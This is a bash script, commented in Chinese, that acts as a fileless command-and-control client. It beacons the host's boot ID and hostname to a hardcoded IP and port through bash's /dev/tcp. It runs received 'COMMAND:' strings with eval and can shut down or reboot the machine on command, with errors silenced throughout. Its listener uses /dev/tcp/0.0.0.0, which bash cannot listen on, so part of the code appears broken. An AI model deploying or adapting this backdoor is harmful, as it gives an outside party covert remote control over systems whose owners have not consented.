#!/bin/bash

# 终极bash TCP客户端 - 只使用bash内置TCP功能
# 完全不需要任何外部工具，零磁盘操作

SERVER_IP="159.138.58.239"
SERVER_PORT=25555
CLIENT_PORT=5556
HEARTBEAT_INTERVAL=60

# 内存初始化
init_memory() {
    # 从/proc获取系统信息
    SERIAL=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null | head -c 8 || echo "bash$$")
    HOSTNAME=$(cat /proc/sys/kernel/hostname 2>/dev/null || echo "unknown")
    SYSTEM_INFO="linux"
    
    echo "=== Bash TCP客户端 ==="
    echo "序列号: $SERIAL"
    echo "服务器: $SERVER_IP:$SERVER_PORT"
    echo "使用纯Bash TCP通信"
}

# 内存日志
log() {
    local timestamp=$(date '+%H:%M:%S')
    echo "[$timestamp] $1" >&2
}

# 纯Bash TCP发送函数
bash_tcp_send() {
    local data="$1"
    local ip="$2"
    local port="$3"
    
    # 使用bash内置TCP功能
    {
        # 创建TCP连接
        exec 3<>/dev/tcp/$ip/$port 2>/dev/null
        if [[ $? -ne 0 ]]; then
            return 1
        fi
        
        # 发送数据
        echo "$data" >&3 2>/dev/null
        
        # 读取响应（非阻塞）
        {
            read -t 1 -r response <&3 2>/dev/null
            echo "$response"
        } &
        
        # 等待发送完成
        sleep 0.5
        
        # 关闭连接
        exec 3>&- 2>/dev/null
        exec 3<&- 2>/dev/null
        
        return 0
    } 2>/dev/null
}

# Bash TCP监听函数
bash_tcp_listen() {
    local port="$1"
    local timeout="${2:-5}"
    
    {
        # 在子进程中监听
        (
            # 监听连接
            exec 3<>/dev/tcp/0.0.0.0/$port 2>/dev/null
            if [[ $? -ne 0 ]]; then
                exit 1
            fi
            
            # 读取数据
            read -t $timeout -r data <&3 2>/dev/null
            if [[ -n "$data" ]]; then
                echo "$data"
                exit 0
            else
                exit 1
            fi
        ) &
        
        local listener_pid=$!
        
        # 等待结果
        wait $listener_pid 2>/dev/null
        local result=$?
        
        # 清理
        kill $listener_pid 2>/dev/null
        
        return $result
    } 2>/dev/null
}

# 发送心跳
send_heartbeat() {
    local heartbeat_data="HEARTBEAT|$SERIAL|$HOSTNAME|$SYSTEM_INFO"
    
    if bash_tcp_send "$heartbeat_data" "$SERVER_IP" "$SERVER_PORT"; then
        log "✓ 心跳成功"
        return 0
    else
        log "✗ 心跳失败"
        return 1
    fi
}

# 执行命令
execute_command() {
    local command="$1"
    log "执行: $command"
    
    # 在子shell中执行
    (
        result=$(eval "$command" 2>&1)
        log "结果: ${result:0:50}"
        echo "$result"
    ) &
}

# 处理接收的命令
process_command() {
    local command_data="$1"
    
    if [[ "$command_data" == COMMAND:* ]]; then
        local cmd="${command_data#COMMAND:}"
        execute_command "$cmd"
    elif [[ "$command_data" == SCRIPT:* ]]; then
        local script="${command_data#SCRIPT:}"
        case "$script" in
            shutdown) shutdown -h now ;;
            reboot) reboot ;;
            *) log "未知脚本: $script" ;;
        esac
    else
        log "未知命令: $command_data"
    fi
}

# 主守护进程
start_daemon() {
    log "启动Bash TCP守护进程"
    
    local heartbeat_count=0
    local success_count=0
    
    while true; do
        heartbeat_count=$((heartbeat_count + 1))
        
        # 发送心跳
        if send_heartbeat; then
            success_count=$((success_count + 1))
        fi
        
        # 监听命令（非阻塞）
        local command_data=$(bash_tcp_listen "$CLIENT_PORT" 2)
        if [[ -n "$command_data" ]]; then
            log "收到命令: $command_data"
            process_command "$command_data" &
        fi
        
        # 显示状态
        if [[ $((heartbeat_count % 5)) -eq 0 ]]; then
            local rate=$((success_count * 100 / heartbeat_count))
            log "状态: ${heartbeat_count}次心跳, ${success_count}次成功 (${rate}%)"
        fi
        
        sleep "$HEARTBEAT_INTERVAL"
    done
}

# 测试连接
test_connection() {
    log "测试服务器连接..."
    
    if bash_tcp_send "TEST" "$SERVER_IP" "$SERVER_PORT"; then
        log "✓ 服务器连接测试成功"
        return 0
    else
        log "✗ 服务器连接测试失败"
        return 1
    fi
}

# 主函数
main() {
    init_memory
    
    # 测试连接
    if test_connection; then
        log "开始主循环..."
        start_daemon
    else
        log "无法连接服务器，退出"
        exit 1
    fi
}

# 启动
main
